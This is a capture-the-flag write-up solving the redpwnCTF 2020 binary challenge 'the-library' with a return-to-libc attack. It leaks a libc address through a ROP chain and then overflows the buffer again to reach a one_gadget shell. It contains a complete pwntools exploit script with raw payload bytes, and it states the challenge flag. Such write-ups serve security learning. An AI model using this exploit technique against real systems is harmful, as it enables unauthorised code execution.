---
layout: post
title: "the-library"
author: "raghul-rajasekar"
---

There's not a lot of useful functions in the binary itself. I wonder where you can get some...
`nc 2020.redpwnc.tf 31350`

**Files:**
- [the-library]({{site.baseurl}}/assets/the-library/the-library)
- [the-library.c]({{site.baseurl}}/assets/the-library/the-library.c)
- [libc.so.6]({{site.baseurl}}/assets/the-library/libc.so.6)

# Solution

Let's take a look at the disassembly of `the-library` using IDA:

![secret-flag disassembly]({{ site.baseurl }}/assets/the-library/the-library.png)

As the program doesn't interact with the flag in any way, it seems our only option is to create a reverse shell to access the files on the server. Running `checksec the-library` reveals that NX is enabled, so we will have to execute a [return-to-libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack). Since we are also provided the `libc.so.6` file, we can use the [`one_gadget`](https://github.com/david942j/one_gadget) tool to identify possible addresses to return to which will invoke a reverse shell.

There's one small catch though: ASLR is enabled. This means that we will first have to find the offset at which `libc` is loaded and add the address of our gadget to it to get the final return address, which will then be inserted into the stack using buffer overflow. How do we do this, considering that the second step depends on the first? I wasn't sure how to go about this until [this write-up](https://made0x78.com/bseries-ret2libc/) offered a simple solution: leak some address from `libc`, return to the beginning of `main` and perform a second buffer overflow to jump to the gadget.

A candidate address to leak is that of `setbuf` (GOT table entry at `0x601020`). In order to leak the address, we will have to stitch a few gadgets together on the stack. The order I chose is
```
<-- (Stack extends this way) pop edi <-- 0x601020 <-- puts <-- address of main
```
>Note: I found the gadget `pop edi` using [`ROPgadget`](https://github.com/JonathanSalwan/ROPgadget) on the `the-library` binary itself; hence, its address is known. The call to `puts` is made by jumping to its PLT entry.

In this way, we can find the offset at which `libc` is loaded (since we can also find the offset of `setbuf` within `libc.so.6`, which turns out to be `0x884d0`). We then perform a second buffer overflow to jump to the gadget at `0x4f2c5` in `libc` identified by `one_gadget` (thankfully, the required conditions for the gadget that the stack must be aligned to 16 bytes and `rcx` must be zeroed out were satisfied). The overall process looks like this:

```python
from pwn import remote
p = remote('2020.redpwnc.tf', 31350)
p.read()
p.write('abcdabcdabcdabcdabcdabcd\x33\x07\x40\x00\x00\x00\x00\x00\x20\x10\x60\x00\x00\x00\x00\x00\x20\x05\x40\x00\x00\x00\x00\x00\x37\x06\x40\x00\x00\x00\x00\x00')  # pop edi; puts; go back to main;
ret = p.read()
hex(int(ret[47:41:-1].hex(), 16) - int('884d0', 16) + int('4f2c5', 16))
p.write('abcdabcdabcdabcdabcdabcd\xc5\x82\x21\x25\x9e\x7f\x00\x00\n')  # Ended up calculating the gadget address manually
p.interactive()  # do whatever you want with shell here
```

# Flag

`flag{jump_1nt0_th3_l1brary}`

